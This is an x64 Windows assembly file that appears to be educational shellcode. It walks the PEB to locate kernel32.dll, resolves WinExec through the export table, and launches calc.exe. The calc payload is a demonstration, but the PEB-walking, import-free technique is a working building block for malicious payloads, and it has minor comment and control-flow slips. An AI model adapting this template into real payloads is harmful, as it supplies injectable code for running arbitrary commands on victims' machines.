; Author: Print3M (https://print3m.github.io/)
; Arch: Windows x64
; 
; This code just runs "calc.exe" without any external dependencies.
;
[bits 64]

section .text:
    global _start              

_start:

; Access PEB structure
xor rbx, rbx
mov rbx, gs:[0x60]          ; RBX = address of PEB struct
mov rbx, [rbx+0x18]         ; RBX = address of PEB_LDR_DATA
add rbx, 0x20               ; RBX = address of InMemoryOrderModuleList

; Go down the double-link list of PEB_LDR_DATA 
mov rbx, [rbx]              ; RBX = 1st entry in InMemoryOrderModuleList (ntdll.dll)
mov rbx, [rbx]              ; RBX = 2st entry in InMemoryOrderModuleList (kernelbase.dll)
mov rbx, [rbx]              ; RBX = 3st entry in InMemoryOrderModuleList (kernel32.dll)

; Get VA address of kernel32.dll
mov rbx, [rbx+0x20]         ; RBX = PEB_LDR_DATA.DllBase (address of kernel32.dll)
mov r8, rbx                 ; R8  = RBX (address of kernel32.dll)

; Get VA address of ExportTable (kernel32.dll)
mov ebx, [r8+0x3c]          ; RBX = kernel32.IMAGE_DOS_HEADER.e_lfanew (PE hdrs offset)
add rbx, r8                 ; RBX = PeHeaders offset + &kernel32.dll = &PeHeaders

xor rcx, rcx
add cl, 0x0088              ; RCX = 0x88 (offset ExportTable RVA)
mov ebx, [rbx+rcx]          ; RBX = &PeHeaders + offset ExportTable RVA = ExportTable RVA
add rbx, r8                 ; RBX = ExportTable RVA + &kernel32.dll = &ExportTable
mov r9, rbx                 ; R9  = &ExportTable

; Get VA address of ExportTable.AddressOfFunctions
xor r10, r10
mov r10d, [r9+0x1c]         ; R10 = ExportTable.AddressOfFunctions RVA
add r10, r8                 ; R10 = &kernel32.dll + RVA = &AddressOfFunctions

; Get VA address of ExportTable.AddressOfNames
xor r11, r11
mov r11d, [r9+0x20]         ; R11 = ExportTable.AddressOfNames RVA
add r11, r8                 ; R11 = &kernel32.dll + RVA = &AddressOfNames

; Get VA address of ExportTable.AddressOfNameOrdinals
xor r12, r12
mov r12d, [r9+0x24]         ; R12 = ExportTable.AddressOfNameOrdinals RVA
add r12, r8                 ; R12 = &kernel32.dll + RVA = &AddressOfNameOrdinals

; Get address of WinExec function exported from kernel32.dll
xor rcx, rcx
add cl, 7                   ; RCX = function name length ("WinExec" == 7)

xor rax, rax
push rax                    ; STACK + null terminator (8)
mov rax, 0x00636578456E6957 ; RAX = function name = \0 + "cexEniW" (WinExec)
push rax                    ; STACK + function name address (8)
mov rbx, rsp                ; RSI = &function_name

call get_winapi_func
mov r13, rax                ; R13 = &WinExec

; Execute WinExec function
;
; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
; );
xor rcx, rcx
xor rdx, rdx

push rcx                    ; STACK + null terminator (8)
mov rcx, 0x6578652e636c6163 ; RCX = "exe.clac" (command string: calc.exe)
push rcx                    ; STACK + command string (8)

mov rcx, rsp                ; RCX = LPCSTR lpCmdLine
mov rdx, 0x1                ; RDX = UINT uCmdShow = 0x1 (SW_SHOWNORMAL)

and rsp, -16                ; 16-byte Stack Alignment
sub rsp, 32                 ; STACK + 32 bytes (shadow space)

call r13                    ; WinExec("calc.exe", SW_SHOWNORMAL)

get_winapi_func:
    ; Requirements (preserved):
    ;   R8  = &kernel32.dll
    ;   R10 = &AddressOfFunctions (ExportTable)
    ;   R11 = &AddressOfNames (ExportTable)
    ;   R12 = &AddressOfNameOrdinals (ExportTable)
    ; Parameters (preserved):
    ;   RBX = (char*) function_name
    ;   RCX = (int)   length of function_name string
    ; Returns:
    ;   RAX = &function
    ;
    ; IMPORTANT: This function doesn't handle "not found" case! 
    ;            Infinite loop and access violation is possible.

    xor rax, rax        ; RAX = counter = 0
    push rcx            ; STACK + RCX (8) = preserve length of function_name string

    ; Loop through AddressOfNames array:
    ;   array item = function name RVA (4 bytes)
    loop:
        xor rdi, rdi            ; RDI = 0
        mov rcx, [rsp]          ; RCX = length of function_name string
        mov rsi, rbx            ; RSI = (char*) function_name 

        mov edi, [r11+rax*4]    ; RDI = function name RVA 
        add rdi, r8             ; RDI = &FunctionName = function name RVA + &kernel32.dll
        repe cmpsb              ; Compare byte *RDI (array item str) and *RSI (param function name)

        je resolve_func_addr    ; Jump if exported function name == param function name

        inc rax                 ; RAX = counter + 1
        jmp short loop

    resolve_func_addr:
        pop rcx                 ; STACK - RCX (8) = remove length of function_name string
        mov ax, [r12+rax*2]     ; RAX = OrdinalNumber = &AddressOfNameOrdinals + (counter * 2) 
        mov eax, [r10+rax*4]    ; RAX = function RVA = &AddressOfFunctions + (OrdinalNumber * 4)
        add rax, r8             ; RAX = &function = function RVA + &kernel32.dll
        ret     